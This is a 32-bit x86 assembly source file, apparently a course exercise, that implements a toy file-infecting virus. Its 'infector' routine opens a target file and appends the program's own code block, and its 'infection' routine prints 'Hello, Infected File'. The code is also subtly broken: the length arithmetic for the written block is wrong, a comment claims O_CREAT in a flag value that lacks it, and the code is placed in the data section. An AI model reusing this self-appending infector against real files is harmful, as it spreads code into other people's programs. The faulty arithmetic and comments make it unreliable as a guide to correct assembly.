section .text
global _start
global system_call
extern main

global infection
global infector


section .data
message db "Hello, Infected File", 10  ; Message to print with newline character
message_len equ $ - message              ; Calculate the length of the message

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    ; Load the message into a register
    mov     eax, 4          ; SYS_WRITE system call
    mov     ebx, 1          ; File descriptor for STDOUT
    mov     ecx, message    ; Address of the message
    mov     edx, message_len ; Length of the message
    int     0x80            ; Invoke system call
    ret
code_end:

infector:
    ; Function prologue
    push    ebp
    mov     ebp, esp

    ; Argument: pointer to the filename (in [ebp + 8])
    mov     eax, 5          ; SYS_OPEN system call number
    mov     ebx, [ebp + 8]  ; Pointer to the filename
    mov     ecx, 1025       ; O_WRONLY | O_APPEND | O_CREAT
    int     0x80            ; Invoke system call

    ; Check if file opened successfully
    test    eax, eax
    js      .error          ; If less than zero, there's an error

    ; Store file descriptor
    mov     ebx, eax

    ; Write the code to the file
    mov     eax, 4          ; SYS_WRITE system call number
    mov     ecx, code_start ; Address of the start of the code
    sub     edx, edx        ; Clear edx for the length
    sub     edx, ecx        ; Calculate the length of the code
    add     edx, code_end   ; Adjust edx to point to the end
    sub     edx, ecx        ; Calculate the length of the code
    int     0x80            ; Invoke system call

    ; Close the file
    mov     eax, 6          ; SYS_CLOSE system call number
    int     0x80            ; Invoke system call

    ; Function epilogue
    pop     ebp
    ret

.error:
    ; Handle error condition (optional)
    ; For example, print an error message and exit
    mov     eax, 1          ; SYS_EXIT system call number
    mov     ebx, 0          ; Clear ebx (return code 0)
    int     0x80            ; Invoke system call
